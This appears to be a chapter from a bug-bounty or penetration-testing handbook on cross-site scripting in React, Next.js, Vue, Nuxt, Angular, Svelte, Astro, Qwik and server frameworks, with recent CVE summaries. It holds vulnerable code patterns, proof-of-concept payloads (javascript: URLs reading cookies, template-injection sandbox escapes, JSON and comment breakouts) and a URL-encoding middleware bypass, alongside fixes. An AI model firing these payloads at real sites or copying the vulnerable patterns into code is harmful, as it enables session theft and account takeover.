# 44 - XSS in Modern Frameworks (Next.js, Nuxt.js, SvelteKit, Angular, Vue, React)

## Overview

Modern frameworks provide auto-escaping by default, but XSS still occurs through:
- Dangerous APIs (dangerouslySetInnerHTML, v-html, {@html}, [innerHTML])
- Server-side rendering (SSR) hydration mismatches
- Client-side template injection (CSTI)
- Improper use of framework APIs
- Third-party component vulnerabilities

## React XSS Vectors

### dangerouslySetInnerHTML

The most common React XSS vector. Despite the scary name, developers still misuse it.

```jsx
// VULNERABLE - user input in dangerouslySetInnerHTML
function Comment({ body }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />;
}

// VULNERABLE - markdown rendering without sanitization
function MarkdownView({ content }) {
  const html = marked.parse(content); // marked does NOT sanitize
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

### href/src with javascript: Protocol

```jsx
// VULNERABLE - React does NOT block javascript: in href
function UserProfile({ website }) {
  return <a href={website}>Visit</a>;
}
// Payload: javascript:alert(document.cookie)

// VULNERABLE - Same with src
function Avatar({ imageUrl }) {
  return <iframe src={imageUrl} />;
}
```

### SSR Injection in Next.js

```jsx
// VULNERABLE - Server component rendering user input as HTML
export async function getServerSideProps({ query }) {
  return { props: { searchTerm: query.q } };
}

function Search({ searchTerm }) {
  return <div dangerouslySetInnerHTML={{ __html: `Results for: ${searchTerm}` }} />;
}
```

### Next.js Specific Vectors

```jsx
// VULNERABLE - next/head with user input
import Head from 'next/head';
function Page({ title }) {
  return (
    <Head>
      <title>{title}</title>  {/* XSS via </title><script>alert(1)</script> */}
    </Head>
  );
}

// VULNERABLE - next/script with user-controlled src
import Script from 'next/script';
function Page({ scriptUrl }) {
  return <Script src={scriptUrl} />;
}

// VULNERABLE - API route reflecting input
// pages/api/redirect.js
export default function handler(req, res) {
  const { url } = req.query;
  res.redirect(url); // Open redirect -> XSS chain
}
```

### __NEXT_DATA__ Exploitation

```html
<!-- In page source, look for: -->
<script id="__NEXT_DATA__" type="application/json">
  {"props":{"pageProps":{"query":"USER_INPUT_HERE"}}}
</script>
<!-- If user input appears here unescaped, it can break out of JSON context -->
<!-- Payload: </script><script>alert(1)</script> -->
```

## Vue.js / Nuxt.js XSS Vectors

### v-html Directive

```html
<!-- VULNERABLE - v-html renders raw HTML -->
<template>
  <div v-html="userContent"></div>
</template>
```

### Client-Side Template Injection (CSTI)

```html
<!-- VULNERABLE - User input in Vue template (if compiled client-side) -->
<!-- Vue 2 CSTI payload -->
{{constructor.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}

<!-- Vue 3 CSTI payload -->
{{$el.ownerDocument.defaultView.alert(1)}}
```

### Nuxt.js Specific

```javascript
// VULNERABLE - server route returning unsanitized HTML
// server/api/search.ts
export default defineEventHandler((event) => {
  const query = getQuery(event);
  return { html: `<p>Results for: ${query.q}</p>` };
});
```

### __NUXT__ Data Exploitation

```html
<!-- Similar to Next.js __NEXT_DATA__ -->
<script>window.__NUXT__={data:[{searchQuery:"USER_INPUT"}]}</script>
<!-- Payload: "}]};alert(1);// -->
```

## Angular XSS Vectors

### bypassSecurityTrust* Methods

```typescript
// VULNERABLE - bypassing Angular's sanitizer with user input
import { DomSanitizer } from '@angular/platform-browser';

@Component({
  template: '<div [innerHTML]="trustedHtml"></div>'
})
export class MyComponent {
  constructor(private sanitizer: DomSanitizer) {
    this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
  }
}
```

### AngularJS (1.x) CSTI (Legacy but still found)

```html
<!-- AngularJS sandbox escape payloads -->
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
{{$on.constructor('alert(1)')()}}
<!-- Angular 1.6+ removed the sandbox entirely, making CSTI trivial -->
```

### innerHTML Binding

```html
<!-- Angular sanitizes [innerHTML] by default, BUT... -->
<!-- VULNERABLE when combined with bypassSecurityTrustHtml -->
<div [innerHTML]="content"></div>

<!-- VULNERABLE - href binding with javascript: -->
<a [href]="userUrl">Click</a>
<!-- Payload: javascript:alert(1) -->
```

## SvelteKit XSS Vectors

### {@html} Tag

```svelte
<!-- VULNERABLE - @html renders raw HTML with NO sanitization -->
<script>
  export let content;
</script>

{@html content}
```

### SvelteKit SSR Vectors

```javascript
// VULNERABLE - load function returning unsanitized HTML
// src/routes/search/+page.server.js
export async function load({ url }) {
  const query = url.searchParams.get('q');
  return {
    html: `<p>Searching for: ${query}</p>`
  };
}
```

## Astro XSS Vectors

```astro
---
const userContent = Astro.url.searchParams.get('content');
---
<!-- VULNERABLE - set:html renders raw HTML -->
<div set:html={userContent}></div>
<Fragment set:html={unsafeContent} />
```

## Common Patterns Across All Frameworks

### 1. Markdown Rendering (universal)

```javascript
// VULNERABLE in ANY framework
import { marked } from 'marked';
const html = marked.parse(userInput);
// Then rendered via dangerous APIs

// FIX: Always sanitize
import DOMPurify from 'dompurify';
const safeHtml = DOMPurify.sanitize(marked.parse(userInput));
```

### 2. Rich Text Editors

WYSIWYG editors (TinyMCE, CKEditor, Quill, ProseMirror, TipTap) output HTML.
If stored and rendered without sanitization = stored XSS.

### 3. URL Handling (universal)

```javascript
// VULNERABLE across all frameworks
<a href={userProvidedUrl}>Link</a>
// Payload: javascript:alert(1)
// Payload: data:text/html,<script>alert(1)</script>

// FIX: Validate URL scheme
function safeUrl(url) {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol) ? url : '#';
  } catch { return '#'; }
}
```

### 4. SSR HTML Injection

SSR creates HTML on the server. If XSS is in SSR output, it fires BEFORE
framework hydration. CSP may not apply to inline content rendered during SSR.

### 5. PostMessage Handlers

```javascript
// VULNERABLE - many SPAs use postMessage for routing/state
window.addEventListener('message', (event) => {
  // No origin check!
  document.getElementById('content').innerHTML = event.data.html;
});
```

### 6. JSON Injection in Hydration Data

All SSR frameworks embed serialized state in the HTML. If user input appears
in this serialized state, it can potentially break out:

```html
<!-- Pattern to look for in page source -->
<script>window.__DATA__={"key":"USER_INPUT_HERE"}</script>
<!-- If USER_INPUT contains: ","exploit":true};</script><script>alert(1)// -->
```

## Testing Methodology

1. **Identify the framework** (view source, headers, bundle analysis)
2. **Search JS bundles** for dangerous APIs:
   - React: dangerouslySetInnerHTML, ref.current.innerHTML
   - Vue: v-html, compile()
   - Angular: bypassSecurityTrustHtml, [innerHTML]
   - Svelte: {@html}
3. **Test URL parameters** that flow into dangerous sinks
4. **Check page source for hydration data** (__NEXT_DATA__, __NUXT__, etc.)
5. **Test markdown/rich-text** rendering paths
6. **Test CSTI** if client-side template compilation is detected
7. **Test postMessage handlers** for origin bypass
8. **Test javascript: and data: URIs** in all href/src attributes

## Bug Bounty Tips

1. SSR XSS is often higher severity because it fires before CSP loads
2. CSTI in Vue/AngularJS is often Critical (full account takeover)
3. Framework version matters -- check for known CVEs
4. Look for __NEXT_DATA__ / __NUXT__ in page source -- user input there is exploitable
5. Rich text editors are almost always vulnerable if output is not sanitized
6. javascript: protocol in href is often missed by developers using React
7. Test both client-side and server-side rendering paths separately
8. Hydration mismatch bugs can sometimes lead to XSS
9. Third-party React/Vue components often use dangerous APIs internally

---
## [2024-2026 Research Update]

### Next.js: React2Shell Server-Side Prototype Pollution (CVE-2025-55182)

**CVE:** CVE-2025-55182
**CVSS:** 10.0 (Critical)
**Affected:** React Server Components packages (`react-server-dom-parcel`, `react-server-dom-webpack`, `react-server-dom-turbopack`) versions 19.0 through 19.2.0
**Next.js tracking:** CVE-2025-66478 -- Next.js 15.x, 16.x, and 14.3.0-canary.77+ affected; patched in 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, and 16.0.7

Server-side prototype pollution in the React Server Components (RSC) serialization protocol. Exploitation is via crafted multipart POST requests with a `Next-Action` header. The upstream patch changes `requireModule` so it returns a module export only if the property is an own property of the module's exports object. Exploitation confirmed against default `create-next-app` projects without authentication. In-the-wild payloads executed shell commands to download scripts or exfiltrate `.env` files.

**Key insight:** Server-side prototype pollution -- which in client-side contexts typically leads to XSS -- escalates directly to remote code execution on the server in the RSC context. The RSC wire protocol (React Flight) creates a new class of server-side deserialization vulnerability structurally similar to Java/PHP deserialization attacks.

**Not affected:** Next.js 13.x, 14.x stable, Pages Router applications, and Edge Runtime.

```
# Vulnerable pattern: default create-next-app with Server Actions enabled
# Attack vector: crafted multipart POST with Next-Action header targeting RSC endpoints
```

**Source:** https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/
**Source:** https://nextjs.org/blog/CVE-2025-66478

### Remix / React Router XSS Vulnerabilities

**CVE-2025-59057 -- Meta-Tag XSS**
Untrusted input passed into route meta tags could execute JavaScript in the browser. Loader/action return values that flow into `<meta>` tags are the injection point.

**CVE-2026-22029 -- Redirect XSS**
Actions and experimental RSC Server Functions performing a redirect to a path constructed from untrusted user input could be hijacked to execute JavaScript.

**Affected:** Remix / React Router (part of a batch of six CVEs disclosed January 2026)

```jsx
// VULNERABLE - Remix meta-tag injection pattern
export const meta = ({ data }) => {
  return [{ title: data.userInput }];  // Unescaped user input in meta tags
};

// VULNERABLE - Redirect XSS pattern
export async function action({ request }) {
  const formData = await request.formData();
  return redirect(formData.get('returnUrl'));  // javascript: URLs not filtered
}
```

**Source:** https://www.netlify.com/changelog/2026-01-15-react-router-remix-security-vulnerabilities/

### SvelteKit / Svelte SSR XSS (CVE-2026-27901)

**CVE-2026-27901 -- SSR contenteditable XSS**
`bind:innerText` and `bind:textContent` values were not escaped during server-side rendering. Fixed in Svelte 5.51.5.

**Svelte SSR spread attribute XSS (no CVE assigned)**
Event handler properties from untrusted data ended up in SSR HTML output when using spread attributes. The framework failed to filter dangerous attributes (e.g., `onclick`) when dynamically spreading props.

**CVE-2025-15265** -- Client-side XSS in Svelte 5.46.0 through 5.46.3.

```svelte
<!-- VULNERABLE - spread attributes with untrusted data -->
<script>
  export let props; // { onclick: "alert(1)", class: "safe" }
</script>
<div {...props}>Content</div>
<!-- SSR renders: <div onclick="alert(1)" class="safe">Content</div> -->

<!-- VULNERABLE - contenteditable binding -->
<div bind:innerText={userContent} contenteditable="true"></div>
<!-- SSR fails to escape userContent -->
```

**Source:** https://www.netlify.com/changelog/2026-01-15-sveltekit-security-vulnerabilities/

### Nuxt.js XSS Vulnerabilities (CVE-2026-45669)

**CVE-2026-45669 -- navigateTo reflected XSS**
Reflected XSS via server-side `navigateTo` with `external: true`. Fixed in Nuxt 3.21.6 and 4.4.6.

**CVE-2025-52662 -- DevTools DOM-based XSS**
DOM-based XSS in Nuxt DevTools. Fixed in DevTools 2.6.4. Part of a chain that could lead to RCE in development environments.

**CVE-2026-56317 -- NoScript slot XSS**
An additional Nuxt XSS vector through NoScript slot handling.

```javascript
// VULNERABLE - navigateTo with user input
navigateTo(userInput, { external: true });
// Payload: javascript:alert(document.cookie)
```

**Source:** https://www.hacktron.ai/security-changelog/nuxt

### Qwik SSR Comment Injection (GHSA-m6jq-g7gq-5w3c)

**Advisory:** GHSA-m6jq-g7gq-5w3c
**Affected:** qwik-city before version 1.19.0
**CVSS:** 5.3 (Medium)

Qwik serializes application state into HTML comments so the client can resume execution from server-rendered output (resumability). The bug is in how component-boundary comments are written: SSR builds comment content for virtual components without escaping or quoting. An attacker-controlled key or value can close the comment early (`-->`) and inject arbitrary HTML/JS.

**Key insight:** Qwik's resumability model is architecturally more exposed to comment-injection XSS than traditional hydration frameworks because it embeds executable metadata (component boundaries, event bindings, state references) directly in HTML comments. In traditional SSR, comments are inert; in Qwik, they drive code execution on the client.

```html
<!-- Qwik serializes state in comments like: -->
<!-- qv q:key=USER_INPUT -->
<!-- Payload: USER_INPUT = "value--><!--><script>alert(1)</script><!--" -->
```

**Source:** https://osv.dev/GHSA-m6jq-g7gq-5w3c

### Astro View Transition Directive XSS (CVE-2026-59727)

**CVE:** CVE-2026-59727
**Affected:** Astro 3.10.0 through 7.0.3, fixed in 7.0.4
**CVSS v4.0:** 2.1 (Low)

The `transition:persist`, `transition:scope`, and `transition:persist-props` directive values are not HTML-escaped when applied to client-hydrated components (islands). If a developer passes request-derived input into these directives, an attacker can inject arbitrary HTML/script.

```astro
---
// VULNERABLE - untrusted input in transition directives
const transitionId = Astro.url.searchParams.get('tid');
---
<div transition:persist={transitionId}>
  <!-- If tid contains XSS payload, it renders unescaped in SSR output -->
</div>
```

**Source:** https://osv.dev/vulnerability/CVE-2026-59727

---

## [2026 API XSS Research Update]

### Django REST Framework: CVE-2024-21520 (Browsable API XSS)

**CVE-2024-21520** (CVSS 6.1, Medium): XSS in the `break_long_headers` template filter used by the DRF Browsable API. Affected versions below 3.15.2. Fixed in DRF 3.15.2 (June 14, 2024).

The Browsable API is enabled by default in DRF and renders HTML forms for API interaction. It is the primary XSS surface in DRF. An older CVE (CVE-2018-25045) affected the same Browsable API through disabled autoescaping in templates, fixed in 3.9.1.

**Mitigation:** Disable Browsable API in production:
```python
REST_FRAMEWORK = {
    'DEFAULT_RENDERER_CLASSES': ['rest_framework.renderers.JSONRenderer'],
}
```

Custom exception handlers that convert JSON error responses to HTML are a developer-introduced XSS vector -- unsanitized field names and error messages rendered via `content_type = 'text/html'` bypass framework protections.

**Source:** [CVEFeed](https://cvefeed.io/vuln/detail/CVE-2024-21520); [DRF Release Notes](https://www.django-rest-framework.org/community/release-notes/)

### Laravel Debug Mode XSS: CVE-2024-13918 and CVE-2024-13919

Two confirmed reflected XSS vulnerabilities affecting Laravel 11.9.0-11.35.1 in debug mode. Both CVSS 8.0 (High). Fixed in Laravel 11.36.0.

- **CVE-2024-13918**: Request parameters rendered on the debug-mode error page without encoding, using Blade `{!! !!}` (raw output) tags
- **CVE-2024-13919**: Route parameters rendered on the debug-mode error page without encoding

**PoC:** Set `APP_DEBUG=true`, create a route that throws an error (e.g., division by zero), visit with `?payload=<script>alert(1)</script>`. The unencoded payload value executes as JavaScript on the 500 error page.

The `{!! !!}` Blade syntax explicitly disables HTML escaping -- any use with user-controlled data is an XSS vector. The vulnerability's precondition is debug mode in production, but the high CVSS reflects severity when this occurs.

**Source:** [SBA Research Advisory](https://www.sba-research.org/2025/03/10/sba-security-advisory-laravel-reflected-xss-via-request-parameter-in-debug-mode-error-page-cve-2024-13918/)

### NestJS Fastify Adapter Middleware Bypass: CVE-2025-69211

**CVE-2025-69211** (CVSS 6.9, Medium): Middleware registered on string-path routes in `@nestjs/platform-fastify` can be skipped by percent-encoding the path. For example, `/%61dmin` for `/admin` bypasses middleware matching. CWE-367 (TOCTOU). Affected versions before 11.1.11.

This is a TOCTOU issue: middleware sees the raw (encoded) path but the router sees the decoded path. Any middleware-based security control (CSP headers, input sanitization, authentication) is bypassable on affected versions.

**Critical distinction:** This CVE applies only to the Fastify adapter. The Express adapter normalizes URL encoding before middleware matching and is not affected.

```typescript
// VULNERABLE: Sanitization middleware bypassed via URL encoding (Fastify adapter)
consumer
  .apply(SanitizationMiddleware)
  .forRoutes('api/comments'); // Only matches exact string
// Attacker sends POST /%61pi/comments with XSS payload -- middleware skipped

// SAFE: Use route objects or upgrade to 11.1.11+
consumer
  .apply(SanitizationMiddleware)
  .forRoutes({ path: 'api/comments', method: RequestMethod.ALL });
```

**Source:** [NVD CVE-2025-69211](https://nvd.nist.gov/vuln/detail/cve-2025-69211); [Mend.io](https://www.mend.io/vulnerability-database/CVE-2025-69211/)

### Express.js res.send() Content-Type Inference Risk

Express's `res.send()` defaults to `text/html` content type for string arguments, making any reflected user input an XSS vector unless the content type is explicitly set. Writing directly to the response object bypasses the template engine and autoescaping.

```javascript
// VULNERABLE: res.send() with string defaults to text/html
app.get('/search', (req, res) => {
  res.send(`No results found for: ${req.query.q}`);
  // /search?q=<script>alert(document.cookie)</script> => XSS
});

// VULNERABLE: error handler reflecting input
app.use((err, req, res, next) => {
  res.status(500).send(`Error processing ${req.originalUrl}: ${err.message}`);
});

// SAFE: explicit content type
app.get('/search', (req, res) => {
  res.type('text/plain').send(`No results found for: ${req.query.q}`);
});
```

Additionally, **CVE-2024-43796** (Express < 4.20.0): Passing untrusted user input to `response.redirect()` may execute untrusted code even after sanitizing. A prototype pollution gadget can also force Express to serve an HTML content type when `res.send(obj)` is called.

**Source:** [Semgrep Cheat Sheet](https://semgrep.dev/docs/cheat-sheets/express-xss); [GHSA-rv95-896h-c2vc](https://github.com/advisories/GHSA-rv95-896h-c2vc)
